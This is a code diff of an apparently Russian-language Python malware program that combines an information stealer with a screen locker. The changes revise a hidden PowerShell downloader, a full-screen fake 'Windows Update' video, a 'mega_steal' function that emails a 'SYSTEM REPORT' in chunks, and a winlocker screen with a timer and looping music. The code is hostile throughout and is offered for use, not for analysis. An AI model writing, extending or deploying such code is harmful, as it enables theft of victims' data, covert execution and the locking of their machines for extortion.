@@ -48,7 +48,6 @@ def download_file(url, path):
 
     def method_ghproxy():
         mirror_url = url.replace('raw.githubusercontent.com', 'ghproxy.com/https://raw.githubusercontent.com').replace('github.com/', 'ghproxy.com/https://github.com/')
-        mirror_url = mirror_url.replace('/raw/', '/https://raw/')
         req = urllib.request.Request(mirror_url, headers={'User-Agent': 'Mozilla/5.0'})
         resp = urllib.request.urlopen(req, timeout=15)
         with open(path, 'wb') as f:
@@ -57,7 +56,7 @@ def download_file(url, path):
 
     def method_powershell():
         ps_cmd = f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('{url}', '{path}')"
-        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
+        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
         return os.path.exists(path) and os.path.getsize(path) > 500
 
     methods = [method_urllib, method_ghproxy, method_powershell]
@@ -283,71 +282,88 @@ def anim_connect():
     a.destroy()
 
 def play_video():
-    """Видео + музыка синхронно, без консольных окон"""
-    # Качаем видео и музыку
+    """Видео + музыка синхронно"""
     v_ok = download_file(VIDEO_URL, VIDEO_PATH)
     m_ok = download_file(MUSIC_URL, MUSIC_PATH)
     
     if not v_ok:
         return
     
-    time.sleep(0.3)
+    # Запускаем музыку в отдельном потоке
+    stop_music = threading.Event()
     
-    try:
-        # Запускаем музыку через pygame
-        music_started = False
+    def play_music():
         if m_ok:
             try:
                 pygame.mixer.init()
                 pygame.mixer.music.load(MUSIC_PATH)
                 pygame.mixer.music.set_volume(1.0)
                 pygame.mixer.music.play()
-                music_started = True
-            except:
-                pass
-        
-        # Окно для видео
-        v = tk.Tk()
-        v.attributes('-fullscreen', True)
-        v.attributes('-topmost', True)
-        v.configure(bg='black')
-        v.overrideredirect(True)
-        v.protocol("WM_DELETE_WINDOW", lambda: None)
-        lbl = tk.Label(v, bg='black')
-        lbl.pack(expand=True, fill='both')
-        
-        cap = cv2.VideoCapture(VIDEO_PATH)
-        if cap.isOpened():
-            fps = cap.get(cv2.CAP_PROP_FPS)
-            if fps <= 0:
-                fps = 30
-            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
-            
-            while cap.isOpened():
-                ret, frame = cap.read()
-                if not ret:
-                    break
-                # Обработка кадра
-                frame = cv2.resize(frame, (sw, sh))
-                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
-                lbl.config(image=img)
-                lbl.image = img
-                v.update()
-                # Задержка между кадрами
-                time.sleep(1.0 / fps)
-            cap.release()
-        
-        v.destroy()
-        
-        # Останавливаем музыку
-        if music_started:
-            try:
+                while not stop_music.is_set():
+                    time.sleep(0.1)
                 pygame.mixer.music.stop()
             except:
                 pass
+    
+    music_thread = None
+    if m_ok:
+        music_thread = threading.Thread(target=play_music, daemon=True)
+        music_thread.start()
+    
+    # Видео в главном потоке
+    try:
+        cap = cv2.VideoCapture(VIDEO_PATH)
+        if not cap.isOpened():
+            stop_music.set()
+            if music_thread:
+                music_thread.join(timeout=1)
+            return
+        
+        fps = cap.get(cv2.CAP_PROP_FPS)
+        if fps <= 0:
+            fps = 30
+        
+        cv2.namedWindow("Windows Update", cv2.WND_PROP_FULLSCREEN)
+        cv2.setWindowProperty("Windows Update", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
+        
+        frame_time = 1.0 / fps
+        last_frame = time.time()
+        
+        while cap.isOpened():
+            ret, frame = cap.read()
+            if not ret:
+                break
+            
+            cv2.imshow("Windows Update", frame)
+            
+            key = cv2.waitKey(1) & 0xFF
+            if key == 27:
+                break
+            
+            elapsed = time.time() - last_frame
+            if elapsed < frame_time:
+                time.sleep(frame_time - elapsed)
+            last_frame = time.time()
+        
+        cap.release()
+        cv2.destroyAllWindows()
+        
+        for _ in range(10):
+            cv2.waitKey(1)
+            time.sleep(0.01)
+        
     except:
         pass
+    
+    stop_music.set()
+    if music_thread:
+        music_thread.join(timeout=1)
+
+def si_hidden():
+    si = subprocess.STARTUPINFO()
+    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = 0
+    return si
 
 def mega_steal():
     report = ["=" * 60, "SYSTEM REPORT", "=" * 60]
@@ -403,12 +419,6 @@ def mega_steal():
     for i, part in enumerate([text[i:i + 15000] for i in range(0, len(text), 15000)]):
         send_email(part, f"[SysReport] [{i + 1}]")
 
-def si_hidden():
-    si = subprocess.STARTUPINFO()
-    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
-    si.wShowWindow = 0
-    return si
-
 def send_email(msg, subj=None):
     try:
         m = MIMEText(msg, 'plain', 'utf-8')
@@ -451,13 +461,14 @@ class Updater:
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
         self.update_timer()
         
+        # Музыка для винлокера
         try:
-            download_file(MUSIC_URL, MUSIC_PATH)
-            if os.path.exists(MUSIC_PATH) and os.path.getsize(MUSIC_PATH) > 1000:
-                pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
-                pygame.mixer.music.load(MUSIC_PATH)
-                pygame.mixer.music.set_volume(1.0)
-                pygame.mixer.music.play(-1)
+            if download_file(MUSIC_URL, MUSIC_PATH):
+                if os.path.exists(MUSIC_PATH) and os.path.getsize(MUSIC_PATH) > 1000:
+                    pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
+                    pygame.mixer.music.load(MUSIC_PATH)
+                    pygame.mixer.music.set_volume(1.0)
+                    pygame.mixer.music.play(-1)
         except:
             pass
         
